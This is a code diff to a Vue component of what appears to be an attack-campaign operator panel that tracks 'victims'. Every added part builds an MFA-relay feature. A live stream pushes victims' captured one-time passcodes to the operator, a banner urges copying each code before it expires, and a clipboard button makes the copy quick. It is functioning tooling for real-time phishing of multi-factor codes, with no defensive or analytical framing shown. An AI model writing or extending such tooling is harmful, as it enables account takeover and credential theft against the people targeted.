@@ -1,5 +1,5 @@
 <script setup>
-import { ref, onMounted, computed } from 'vue'
+import { ref, onMounted, onBeforeUnmount, computed, watch } from 'vue'
 import Accordion from 'primevue/accordion'
 import AccordionPanel from 'primevue/accordionpanel'
 import AccordionHeader from 'primevue/accordionheader'
@@ -11,6 +11,8 @@ import Dialog from 'primevue/dialog'
 import Tag from 'primevue/tag'
 import { useToast } from 'primevue/usetoast'
 import { backendService } from '@/services/backend'
+import { useOperatorStream } from '@/composables/useOperatorStream'
+import { useVisibilityPolling } from '@/composables/useVisibilityPolling'
 
 const props = defineProps({
     victim: Object,
@@ -23,6 +25,7 @@ const loading = ref(false)
 const selectedResult = ref(null)
 const selectedModuleName = ref('')
 const resultDetailVisible = ref(false)
+const otpAlert = ref(null)
 
 const categoryIcons = {
     'Credential Access': '🔑',
@@ -32,12 +35,68 @@ const categoryIcons = {
     'Exfiltration': '📤',
     'Social Engineering': '🎭',
     'Browser Exploitation': '🌐',
+    'MFA Relay': '🛡️',
     'Custom': '⚙️'
 }
 
-onMounted(async () => {
-    await loadModulesData()
+const { status: streamStatus, connect: connectStream, disconnect: disconnectStream } = useOperatorStream({
+    campaignId: () => props.campaign?.id,
+    onModuleData: handleModuleData
 })
+
+// Polling stays as the fallback data source whenever the live stream is down.
+useVisibilityPolling(loadModulesData, {
+    intervalMs: 15000,
+    enabled: () => streamStatus.value !== 'open'
+})
+
+onMounted(() => {
+    connectStream()
+})
+
+onBeforeUnmount(() => {
+    disconnectStream()
+})
+
+watch(() => props.campaign?.id, (newId, oldId) => {
+    if (newId !== oldId) {
+        disconnectStream()
+        otpAlert.value = null
+        connectStream()
+    }
+})
+
+function handleModuleData(payload) {
+    if (!props.victim || payload.victim_id !== props.victim.id) return
+
+    loadModulesData()
+
+    const code = payload.metadata?.code
+    if (code) {
+        otpAlert.value = {
+            code: String(code),
+            moduleName: payload.module_name || 'MFA Relay'
+        }
+        toast.add({
+            severity: 'warn',
+            summary: 'OTP code captured',
+            detail: `${code} — copy it now, it may expire soon`,
+            life: 8000
+        })
+    }
+}
+
+function copyOtpCode() {
+    if (!otpAlert.value) return
+    navigator.clipboard.writeText(otpAlert.value.code).then(() => {
+        toast.add({
+            severity: 'success',
+            summary: 'Copied',
+            detail: 'OTP code copied to clipboard',
+            life: 2000
+        })
+    })
+}
 
 async function loadModulesData() {
     if (!props.campaign || !props.victim) return
@@ -168,6 +227,32 @@ const hasData = computed(() => modulesData.value.length > 0)
                 @click="loadModulesData"
                 :loading="loading"
             />
+        </div>
+
+        <div v-if="otpAlert" class="otp-banner">
+            <div class="otp-banner-info">
+                <i class="pi pi-shield"></i>
+                <div class="otp-banner-text">
+                    <strong>OTP code captured — {{ otpAlert.moduleName }}</strong>
+                    <code class="otp-code">{{ otpAlert.code }}</code>
+                </div>
+            </div>
+            <div class="otp-banner-actions">
+                <Button
+                    icon="pi pi-copy"
+                    label="Copy"
+                    size="small"
+                    @click="copyOtpCode"
+                />
+                <Button
+                    icon="pi pi-times"
+                    text
+                    rounded
+                    size="small"
+                    aria-label="Dismiss"
+                    @click="otpAlert = null"
+                />
+            </div>
         </div>
 
         <!-- Loading State -->
@@ -370,6 +455,49 @@ const hasData = computed(() => modulesData.value.length > 0)
     font-weight: 600;
     color: var(--color-heading);
     margin: 0;
+}
+
+/* Live OTP capture banner */
+.otp-banner {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1rem;
+    padding: 0.75rem 1rem;
+    border: 1px solid var(--color-border);
+    border-left: 4px solid #e6a23c;
+    border-radius: 6px;
+    background: var(--color-background-mute);
+}
+
+.otp-banner-info {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+}
+
+.otp-banner-info i {
+    font-size: 1.5rem;
+    color: #e6a23c;
+}
+
+.otp-banner-text {
+    display: flex;
+    flex-direction: column;
+    gap: 0.25rem;
+}
+
+.otp-code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 1.1rem;
+    letter-spacing: 2px;
+    color: var(--color-heading);
+}
+
+.otp-banner-actions {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
 }
 
 /* Loading & Empty States */
